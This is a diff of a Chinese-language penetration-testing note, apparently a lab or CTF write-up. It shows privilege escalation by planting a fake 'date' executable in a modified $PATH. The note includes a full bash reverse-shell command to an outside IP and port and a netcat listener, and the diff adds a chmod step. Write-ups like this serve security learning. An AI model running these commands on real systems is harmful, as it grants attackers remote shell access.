@@ -134,6 +134,8 @@ IP :
 	- 所以我們可以修改 `$PATH` ，增加路徑，並放上我們自己ㄉ `date` 檔案
 		- 放一個 reverse shell
 			- `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`
+		- 再給他權限
+			- `chmod +x date`
 		- 攻擊機準備好 reverse shell
 			- `nc -vlk 7877` 
 		- 再輸入以下指令
